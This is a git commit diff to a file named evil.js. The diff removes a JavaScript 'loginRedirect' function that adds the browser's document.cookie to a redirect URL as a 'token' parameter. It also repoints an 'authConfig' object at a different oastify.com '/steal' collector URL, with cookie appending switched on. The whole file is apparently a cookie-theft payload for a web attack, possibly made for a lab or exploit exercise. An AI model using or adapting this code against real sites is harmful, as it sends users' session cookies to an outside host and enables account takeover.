81362c02c517ee70d69876db58af61a81ba6d6fb
nguyenkhai98 <51147179+nguyenkhai98@users.noreply.github.com>
2026-03-23 15:28:55 +0700

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,29 +1,6 @@
-window.Auth = window.Auth || {};
-
-window.Auth.loginRedirect = function (data) {
-    console.log("[Auth] Callback received data:", data);
-
-    let config = window.authConfig || {
-        dataset: {
-            next: '/',
-            append: 'false'
-        }
-    };
-
-    let redirectUrl = config.dataset.next || '/';
-
-    if (config.dataset.append === 'true') {
-        let delimiter = redirectUrl.includes('?') ? '&' : '?';
-        redirectUrl += delimiter + "token=" + encodeURIComponent(document.cookie);
-    }
-
-    console.log("[Auth] Redirecting to:", redirectUrl);
-    window.location.href = redirectUrl;
-};
-
 window.authConfig = {
     dataset: {
-        next: 'https://ztwd6th606h2292kadlx6n681z7qvgj5.oastify.com/steal',
+        next: 'https://fp8v0eivh5honqndp2kw9a0w8nee25qu.oastify.com/steal',
         append: 'true'
     }
 };
